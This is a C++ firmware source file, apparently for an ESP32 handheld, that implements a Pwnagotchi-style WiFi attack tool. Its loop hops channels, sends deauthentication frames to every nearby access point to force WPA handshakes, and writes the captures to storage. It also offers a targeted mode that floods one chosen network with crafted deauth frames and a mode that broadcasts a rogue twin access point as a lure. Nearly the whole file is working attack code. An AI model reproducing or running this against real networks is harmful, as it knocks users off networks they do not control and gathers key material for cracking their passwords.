#if !defined(LITE_VERSION)
#include "../wifi/sniffer.h"
#include "../wifi/mopie_tx.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "spam.h"
#include "ui.h"
#include <Arduino.h>
#include <algorithm>
#include <map>
#include <set>
#include <vector>

// ============================================================================
// DetectiveMopie state machine
// ============================================================================
// Phases mirror the real Pwnagotchi algorithm:
//   RECON   → hop all channels to discover APs
//   INTERACT→ process channels by AP density (deauth, wait for handshake)
//   ADVERTISE→ pwngrid beacon spam + friend discovery
// ============================================================================

// ---------------------------------------------------------------------------
// Constants (tuned for ESP32-S3 — less powerful than RPi zero)
// ---------------------------------------------------------------------------
#define MOPIE_RECON_HOP_MS 350           // ms per channel during recon hop
#define MOPIE_RECON_DEAUTH_MS 300        // ms to send deauths on a channel
#define MOPIE_HOP_RECON_MS 3500          // ms to wait on channel after deauth
#define MOPIE_MIN_RECON_MS 1200          // ms to wait if no deauth on channel
#define MOPIE_MAX_AP_INTERACTIONS 4      // max deauth attempts per AP per cycle
#define MOPIE_ADVERTISE_INTERVAL_MS 3000 // ms between pwngrid beacons
#define MOPIE_ADVERTISE_PHASE_MS 12000   // total ms for advertise phase

// Phase enum
enum class MopiePhase : uint8_t { RECON, INTERACT, ADVERTISE };

// ---------------------------------------------------------------------------
// Old globals kept for compatibility
// ---------------------------------------------------------------------------
uint8_t state;
uint8_t current_channel = 255;
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;
bool use_all_channels = false;

const uint8_t pri_wifi_channels_default[] = {1, 6, 11};
const uint8_t *active_channels = pri_wifi_channels_default;
uint8_t active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);

// ---------------------------------------------------------------------------
// Forward declarations
// ---------------------------------------------------------------------------
void advertise(uint8_t channel);
void wakeUp();
void toggle_all_channels();
static uint64_t bruceMacToKey(const void *mac);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
static uint64_t bruceMacToKey(const void *mac) {
    const uint8_t *u = (const uint8_t *)mac;
    uint64_t key = 0;
    for (int i = 0; i < 6; ++i) { key = (key << 8) | (uint64_t)u[i]; }
    return key;
}

// Count how many (non-stale) beacons are on a given channel
static int countBeaconsOnChannel(uint8_t channel) {
    int cnt = 0;
    for (const auto &b : registeredBeacons) {
        if (b.channel == channel) cnt++;
    }
    return cnt;
}

// ---------------------------------------------------------------------------
// State machine context
// ---------------------------------------------------------------------------
struct MopieState {
    MopiePhase phase;
    uint32_t phaseStart;
    uint32_t lastAdvertise;
    uint8_t reconIdx;
    uint8_t interactIdx;
    bool didDeauth;
    int prevHS;
    std::vector<uint8_t> sortedChannels;
    std::map<uint64_t, uint8_t> apDeauthCount;
};

// Forward declarations for phase functions
static void reconPhase(MopieState &s);
static void interactPhase(MopieState &s);
static void advertisePhase(MopieState &s);

// ---------------------------------------------------------------------------
// toggle_all_channels — swap between 3-chan (1,6,11) and all 12
// ---------------------------------------------------------------------------
void toggle_all_channels() {
    use_all_channels = !use_all_channels;
    if (use_all_channels) {
        active_channels = all_wifi_channels;
        active_channels_size = sizeof(all_wifi_channels) / sizeof(all_wifi_channels[0]);
    } else {
        active_channels = pri_wifi_channels_default;
        active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);
    }
    current_channel = 255;
}

// ---------------------------------------------------------------------------
// detective_mopie_setup — init pwngrid + UI
// ---------------------------------------------------------------------------
void detective_mopie_setup() {
    initPwngrid();
    initUi();
    state = 0; // STATE_INIT
}

// ---------------------------------------------------------------------------
// wakeUp — startup animation across channels
// ---------------------------------------------------------------------------
void wakeUp() {
    for (uint8_t i = 0; i < active_channels_size; i++) {
        ch = active_channels[i];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        setMood(i % 23);
        updateUi(false);
        vTaskDelay(800 / portTICK_RATE_MS);
    }
}

// ---------------------------------------------------------------------------
// advertise — send pwngrid beacon, check for errors
// ---------------------------------------------------------------------------
void advertise(uint8_t channel) {
    uint32_t elapsed = millis() - last_mood_switch;
    if (elapsed > 2500) {
        setMood(random(2, 23));
        last_mood_switch = millis();
    }

    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

    if (result == ESP_ERR_WIFI_IF) {
        setMood(19, "", "Error: invalid interface", true);
    } else if (result == ESP_ERR_INVALID_ARG) {
        setMood(19, "", "Error: invalid argument", true);
    } else if (result == ESP_ERR_NO_MEM) {
        setMood(19, "", "Error: not enough memory", true);
    } else if (result != ESP_OK) {
        setMood(19, "", "Error: unknown", true);
    }
}

void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }

// MAC -> "AA:BB:CC:DD:EE:FF" string helper (BeaconList.MAC is char[6])
static String dmMacStr(const char *m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             (uint8_t)m[0], (uint8_t)m[1], (uint8_t)m[2],
             (uint8_t)m[3], (uint8_t)m[4], (uint8_t)m[5]);
    return String(buf);
}

// ---------------------------------------------------------------------------
// dmTargetedDeauth — pick ONE AP from the live scan, force-deauth just it,
// then stay on its channel waiting for a handshake. Unlike the passive
// auto-cycle, this guarantees the key material is attempted on your target.
// Uses real wsl_bypasser_send_raw_frame + the sniffer handshake cache.
// ---------------------------------------------------------------------------
void dmTargetedDeauth() {
    // Build a selectable list of APs (MAC + channel) from the live beacon set
    std::vector<BeaconList> apList(registeredBeacons.begin(), registeredBeacons.end());
    if (apList.empty()) { displayWarning("No APs seen yet", true); return; }

    std::vector<Option> apOpts;
    for (size_t i = 0; i < apList.size() && i < 24; i++) {
        String label = dmMacStr(apList[i].MAC) + " ch" + String(apList[i].channel);
        apOpts.push_back({label, [i]() {}, false});
    }
    apOpts.push_back({"Back", []() {}, false});
    int pick = loopOptions(apOpts, MENU_TYPE_SUBMENU, "Target AP");
    if (pick < 0 || pick >= (int)apList.size()) return;

    auto &tgt = apList[pick];
    uint8_t tchan = tgt.channel ? tgt.channel : 1;
    uint64_t tkey = bruceMacToKey(tgt.MAC);
    String tgtMac = dmMacStr(tgt.MAC);

    // Clear the menu, draw a targeting screen
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("LOCKED ON", tftWidth / 2, 8, 1);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString(tgtMac, tftWidth / 2, 30, 1);
    tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
    tft.drawCentreString("Deauthing on ch" + String(tchan) + " ...", tftWidth / 2, 50, 1);
    tft.drawCentreString("PWR to stop", tftWidth / 2, tftHeight - 20, 1);

    esp_wifi_set_channel(tchan, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(50 / portTICK_PERIOD_MS);

    // Hammer the target with deauths, watch for a handshake
    setMood(0, "(>__<)", "Locked: " + tgtMac);
    updateUi(true);
    unsigned long t0 = millis();
    int deauthCount = 0;
    uint8_t dframe[26];
    mopie_build_deauth(dframe, (const uint8_t *)tgt.MAC, _default_target, 0x0001);
    while (!check(EscPress) && !pwnagotchi_exit && millis() - t0 < 15000) {
        // send our OWN from-scratch directed deauth to the target
        mopie_send_raw(dframe, sizeof(dframe), tchan, 1);
        deauthCount++;

        // quick blip animation on the screen while we hammer
        if (deauthCount % 5 == 0) {
            tft.drawCentreString("deauth x" + String(deauthCount), tftWidth / 2, tftHeight - 40, 1);
        }

        // did we catch a handshake from this target?
        if (sniffer_is_handshake_ready(tkey)) {
            setMood(0, "(O__O)", "HANDSHAKE from target!");
            updateUi(true);
            drawHandshakeCaught();
            vTaskDelay(900 / portTICK_PERIOD_MS);
            break;
        }
        vTaskDelay(150 / portTICK_PERIOD_MS);
    }

    // return to the recon UI
    tft.fillScreen(bruceConfig.bgColor);
    setMood(8, "(-@_@)", "Targeting done (" + String(deauthCount) + " deauths)");
    updateUi(true);
}

// ---------------------------------------------------------------------------
// dmNetStats — live air-traffic summary: AP count, per-channel density,
// deauth attempts, handshakes. Pure recon readout, no radio change.
// ---------------------------------------------------------------------------
void dmNetStats() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("NET STATS", tftWidth / 2, 8, 1);
    tft.setTextSize(1);

    int y = 22;
    auto line = [&](const String &s) { tft.drawString(s, 8, y, 1); y += 14; };

    line("APs seen:  " + String((int)registeredBeacons.size()));
    line("Channels:  " + String((int)active_channels_size));

    // per-channel density
    std::map<uint8_t, int> chanCount;
    for (const auto &b : registeredBeacons) chanCount[b.channel]++;
    int chIdx = 0;
    for (const auto &p : chanCount) {
        if (chIdx++ >= 8) break;
        line("ch" + String(p.first) + ": " + String(p.second) + " APs");
    }

    line("Handshakes: " + String(num_HS));
    line("Decoys:     (pwngrid active)");

    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString("PWR to close", tftWidth / 2, tftHeight - 16, 1);
    while (!check(EscPress) && !check(AnyKeyPress)) vTaskDelay(50);

    tft.fillScreen(bruceConfig.bgColor);
    updateUi(true);
}

// ---------------------------------------------------------------------------
// dmSummonRogue — broadcast a fake AP beacon for a captured target, as a lure.
// Picks any AP from the recon set and summons a rogue twin via Mopie's own
// beacon builder — a "catch, then lure" follow-up brucegotchi can't do.
// ---------------------------------------------------------------------------
void dmSummonRogue() {
    std::vector<BeaconList> apList(registeredBeacons.begin(), registeredBeacons.end());
    if (apList.empty()) { displayWarning("No APs seen yet", true); return; }

    std::vector<Option> apOpts;
    for (size_t i = 0; i < apList.size() && i < 12; i++) {
        apOpts.push_back({dmMacStr((const char *)apList[i].MAC) + " ch" + String(apList[i].channel), [i]() {}, false});
    }
    apOpts.push_back({"Back", []() {}, false});
    int pick = loopOptions(apOpts, MENU_TYPE_SUBMENU, "Summon rogue of");
    if (pick < 0 || pick >= (int)apList.size()) return;

    auto &tgt = apList[pick];
    uint8_t bssid[6];
    memcpy(bssid, tgt.MAC, 6);
    bssid[0] |= 0x02;   // tweak the local-admin bit so it's recognizably "the twin"

    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawCentreString("SUMMONING ROGUE AP", tftWidth / 2, 14, 1);
    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
    tft.drawCentreString(dmMacStr((const char *)bssid), tftWidth / 2, 42, 1);
    tft.setTextColor(bruceConfig.secColor, bruceConfig.bgColor);
    tft.drawCentreString("beaconing ch" + String(tgt.channel) + " ...", tftWidth / 2, 60, 1);

    uint8_t frame[128];
    // craft SSID = "rogue-" + short bssid
    char ssid[20];
    snprintf(ssid, sizeof(ssid), "rogue-%02X%02X%02X", bssid[3], bssid[4], bssid[5]);
    size_t fl = mopie_build_beacon(frame, bssid, ssid);
    unsigned long t0 = millis();
    int sent = 0;
    while (!check(EscPress) && millis() - t0 < 10000) {
        if (fl) sent += mopie_send_raw(frame, fl, tgt.channel, 1);
        vTaskDelay(120);
    }
    tft.fillScreen(bruceConfig.bgColor);
    setMood(14, "(T_T)", "Rogue beacon done (" + String(sent) + ")");
    updateUi(true);
}

// ---------------------------------------------------------------------------
// RECON phase — hop all channels, build sorted AP list
// ---------------------------------------------------------------------------
static void reconPhase(MopieState &s) {
    uint8_t nCh = active_channels_size;

    if (s.reconIdx < nCh) {
        unsigned long elapsed = millis() - s.phaseStart;
        if (elapsed >= MOPIE_RECON_HOP_MS) {
            s.reconIdx++;
            if (s.reconIdx < nCh) {
                ch = active_channels[s.reconIdx];
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                s.phaseStart = millis();
            }
        }
    }

    if (s.reconIdx >= nCh) {
        std::map<uint8_t, int> chanCount;
        for (const auto &b : registeredBeacons) { chanCount[b.channel]++; }

        s.sortedChannels.clear();
        std::vector<std::pair<uint8_t, int>> chList(chanCount.begin(), chanCount.end());
        std::sort(
            chList.begin(),
            chList.end(),
            [](const std::pair<uint8_t, int> &a, const std::pair<uint8_t, int> &b) {
                return a.second > b.second;
            }
        );
        for (auto &p : chList) { s.sortedChannels.push_back(p.first); }

        for (uint8_t i = 0; i < nCh; i++) {
            uint8_t c = active_channels[i];
            if (chanCount.find(c) == chanCount.end()) { s.sortedChannels.push_back(c); }
        }

        s.apDeauthCount.clear();
        s.phase = MopiePhase::INTERACT;
        s.interactIdx = 0;
        s.phaseStart = millis();

        int totalAPs = registeredBeacons.size();
        char buf[48];
        snprintf(buf, sizeof(buf), "Found %d APs on %d channels", totalAPs, (int)s.sortedChannels.size());
        setMood(8, "(-@_@)", buf);
        updateUi(true);
        vTaskDelay(600 / portTICK_PERIOD_MS);
        s.phaseStart = millis();
    }
}

// ---------------------------------------------------------------------------
// INTERACT phase — per-channel deauth + handshake waiting
// ---------------------------------------------------------------------------
static void interactPhase(MopieState &s) {
    if (s.interactIdx < s.sortedChannels.size()) {
        uint8_t currentChan = s.sortedChannels[s.interactIdx];
        unsigned long elapsed = millis() - s.phaseStart;

        if (elapsed < 50) {
            ch = currentChan;
            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            vTaskDelay(30 / portTICK_PERIOD_MS);
        }

        if (elapsed >= 50 && elapsed < (uint32_t)(50 + MOPIE_RECON_DEAUTH_MS)) {
            ch = currentChan;
            int apCount = countBeaconsOnChannel(currentChan);
            int skipped = 0;

            for (const auto &beacon : registeredBeacons) {
                if (beacon.channel != currentChan) continue;
                if (check(SelPress)) break;
                if (pwnagotchi_exit) break;

                uint64_t key = bruceMacToKey(beacon.MAC);

                if (sniffer_is_handshake_ready(key)) {
                    skipped++;
                    continue;
                }

                if (s.apDeauthCount[key] >= MOPIE_MAX_AP_INTERACTIONS) {
                    skipped++;
                    continue;
                }

                memcpy(&ap_record.bssid, beacon.MAC, 6);
                wsl_bypasser_send_raw_frame(&ap_record, currentChan, _default_target);
                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
                s.apDeauthCount[key]++;
                s.didDeauth = true;
            }

            if (s.didDeauth) {
                char buf[48];
                int attempted = apCount - skipped;
                snprintf(buf, sizeof(buf), "Deauthing ch%d (%d/%d APs)", currentChan, attempted, apCount);
                setMood(8, "(-@_@)", buf);
                updateUi(true);
            }
        }

        uint32_t waitTarget = s.didDeauth ? MOPIE_HOP_RECON_MS : MOPIE_MIN_RECON_MS;
        if (elapsed >= (uint32_t)(50 + MOPIE_RECON_DEAUTH_MS + waitTarget)) {
            s.interactIdx++;
            s.didDeauth = false;
            s.phaseStart = millis();

            ssize_t remaining = (ssize_t)s.sortedChannels.size() - (ssize_t)s.interactIdx;
            if (remaining > 0 && s.interactIdx < s.sortedChannels.size()) {
                char buf[48];
                snprintf(
                    buf, sizeof(buf), "Next: ch%d (%d left)", s.sortedChannels[s.interactIdx], (int)remaining
                );
                setMood(8, "(-@_@)", buf);
                updateUi(true);
            }
        }
    }

    if (s.interactIdx >= s.sortedChannels.size()) {
        s.phase = MopiePhase::ADVERTISE;
        s.phaseStart = millis();
        s.lastAdvertise = 0;
        setMood(10, "(^__^)", "Making friends!");
        updateUi(true);
    }
}

// ---------------------------------------------------------------------------
// ADVERTISE phase — pwngrid beacon spam
// ---------------------------------------------------------------------------
static void advertisePhase(MopieState &s) {
    if (s.lastAdvertise == 0 || millis() - s.lastAdvertise >= MOPIE_ADVERTISE_INTERVAL_MS) {
        advertise(ch);
        s.lastAdvertise = millis();
    }

    if (millis() - s.phaseStart >= MOPIE_ADVERTISE_PHASE_MS) {
        s.phase = MopiePhase::RECON;
        s.reconIdx = 0;
        s.interactIdx = 0;
        s.didDeauth = false;
        s.sortedChannels.clear();
        s.apDeauthCount.clear();

        ch = active_channels[0];
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        setMood(14, "(@__@)", "Scanning...");
        updateUi(true);
        s.phaseStart = millis();
    }
}

// ---------------------------------------------------------------------------
// detective_mopie_start — main entry point
// ---------------------------------------------------------------------------
void detective_mopie_start() {
    set_pwnagotchi_exit(false);

    tft.fillScreen(bruceConfig.bgColor);
    num_HS = 0;
    sniffer_reset_handshake_cache();
    registeredBeacons.clear();
    vTaskDelay(300 / portTICK_RATE_MS);

    // Prepare storage
    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        if (!SD.exists("/MopiePCAP")) SD.mkdir("/MopiePCAP");
        if (!SD.exists("/MopiePCAP/handshakes")) SD.mkdir("/MopiePCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/MopiePCAP")) LittleFS.mkdir("/MopiePCAP");
        if (!LittleFS.exists("/MopiePCAP/handshakes")) LittleFS.mkdir("/MopiePCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }
    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        sniffer_set_mode(SnifferMode::HandshakesOnly);
        sniffer_reset_handshake_cache();
    }

    detective_mopie_setup();
    drawTopCanvas();
    drawBottomCanvas();
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    sniffer_set_mode(SnifferMode::HandshakesOnly);

#if defined(HAS_TOUCH)
    TouchFooter();
#endif

    // --- State machine ---
    MopieState s;
    s.phase = MopiePhase::RECON;
    s.phaseStart = millis();
    s.lastAdvertise = 0;
    s.prevHS = 0;
    s.reconIdx = 0;
    s.interactIdx = 0;
    s.didDeauth = false;

    // First iteration: set initial channel immediately
    ch = active_channels[0];
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    setMood(14, "(@__@)", "Scanning...");
    updateUi(true);
    s.phaseStart = millis();
    s.reconIdx = 0;

    while (true) {
        // --- Global exit checks ---
        if (check(EscPress) || pwnagotchi_exit) break;

        // --- Menu trigger ---
        if (check(SelPress)) {
            String channel_status = use_all_channels ? "All Ch: ON" : "All Ch: OFF";
            options = {
                {"Targeted Deauth", [&]() { dmTargetedDeauth(); }},
                {"Net Stats", [&]() { dmNetStats(); }},
                {"Summon Rogue AP", [&]() { dmSummonRogue(); }},
                {"Find friends", yield},
                {"Net beacon", send_pwnagotchi_beacon_main},
                {channel_status.c_str(), toggle_all_channels},
                {"Main Menu", lambdaHelper(set_pwnagotchi_exit, true)},
            };
            loopOptions(options);
            tft.fillScreen(bruceConfig.bgColor);
            drawTopCanvas();
            drawBottomCanvas();
            updateUi(true);
            s.phaseStart = millis();
            s.lastAdvertise = 0;
        }

        // --- Handshake celebration ---
        if (num_HS > s.prevHS) {
            s.prevHS = num_HS;
            setMood(0, "(0__0)", "Got handshake!");
            updateUi(true);
            drawHandshakeCaught();
#if defined(BUZZ_PIN)
            tone(BUZZ_PIN, 1047, 60); delay(70);   // C6 blip
            tone(BUZZ_PIN, 1568, 90); delay(100);  // G6 hit
            noTone(BUZZ_PIN);
#endif
            vTaskDelay(700 / portTICK_PERIOD_MS);
        }

        // --- Dispatch current phase ---
        switch (s.phase) {
            case MopiePhase::RECON: reconPhase(s); break;
            case MopiePhase::INTERACT: interactPhase(s); break;
            case MopiePhase::ADVERTISE: advertisePhase(s); break;
        }

        // --- Periodic UI update ---
        static unsigned long lastUiUpdate = 0;
        if (millis() - lastUiUpdate > 2000) {
            updateUi(true);
            lastUiUpdate = millis();
        }

        vTaskDelay(20 / portTICK_RATE_MS);
    }

    // Cleanup — everything must be fully stopped
    sniffer_wait_for_flush(2000);            // drain any pending handshake writes
    esp_wifi_set_promiscuous(false);         // stop promiscuous capture
    esp_wifi_set_promiscuous_rx_cb(nullptr); // remove sniffer callback
    wifiDisconnect();                        // fully stop WiFi (AP + STA + mode OFF)
    registeredBeacons.clear();               // clear AP beacon list
    clearPwngridPeers();                     // clear pwngrid peer list
    sniffer_reset_handshake_cache();         // clear handshake tracking state
}
#endif
